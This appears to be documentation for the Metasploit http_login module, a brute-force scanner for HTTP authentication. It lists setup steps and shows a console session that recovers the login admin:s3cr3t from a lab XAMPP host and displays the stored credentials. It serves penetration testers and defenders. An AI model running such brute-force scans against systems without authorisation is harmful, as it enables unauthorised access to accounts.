## Description

This module is a brute-force login scanner that attempts to authenticate to a system using HTTP authentication. More info can be found in [cve-1999-0502](https://www.cvedetails.com/cve/cve-1999-0502).

## Verification Steps

1. Do: ```use auxiliary/scanner/http/http_login```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set RPORT [PORT]```
4. Do: ```run```

## Scenarios

```
msf > use auxiliary/scanner/http/http_login
msf auxiliary(http_login) > set AUTH_URI /xampp/
AUTH_URI => /xampp/
msf auxiliary(http_login) > set RHOSTS 192.168.1.201
RHOSTS => 192.168.1.201
msf auxiliary(http_login) > set VERBOSE false
VERBOSE => false
msf auxiliary(http_login) > run

[*] Attempting to login to http://192.168.1.201:80/xampp/ with Basic authentication
[+] http://192.168.1.201:80/xampp/ - Successful login 'admin' : 's3cr3t'
[*] http://192.168.1.201:80/xampp/ - Random usernames are not allowed.
[*] http://192.168.1.201:80/xampp/ - Random passwords are not allowed.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(http_login) >
```

**Checking the credentials stored**

```
msf auxiliary(http_login) > creds
Credentials
===========

host           origin         service        public  private  realm  private_type
----           ------         -------        ------  -------  -----  ------------
192.168.1.201  192.168.1.201  80/tcp (http)  admin   s3cr3t          Password

msf auxiliary(http_login) >
```
